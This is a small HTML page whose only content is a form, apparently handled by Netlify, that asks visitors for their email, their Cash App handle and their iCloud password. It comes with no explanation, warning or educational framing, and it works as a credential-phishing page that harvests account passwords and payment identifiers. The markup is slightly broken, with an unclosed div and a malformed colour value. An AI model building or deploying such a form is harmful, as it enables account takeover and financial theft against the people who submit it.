
<!DOCTYPE html>
<html>
    <style>
        .flex-container5 {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          z-index:-1;
          flex: 1 0 20%;
          height: 100px;
          background-color: white;
        }
        body{
          padding: 25px;
          background-color:rgb(240,240,240,255);
        }
    </style>
    <body>
        <div class="flex-container5"></div>
        <div class="flex-container">
            <form name="contact" method="POST" data-netlify="true">
            <label>
              Your email:
              <input type="email" name="email">
            </label>
            <label>
              Your cashapp:
               <input name="cashapp">
              </label>
            <label>
              Your iCloud password:
              <textarea name="password"></textarea>
            </label>
            <!-- your other form fields go here -->
            <button type="submit">Send</button>
          </form>
          
    </body>
</html>
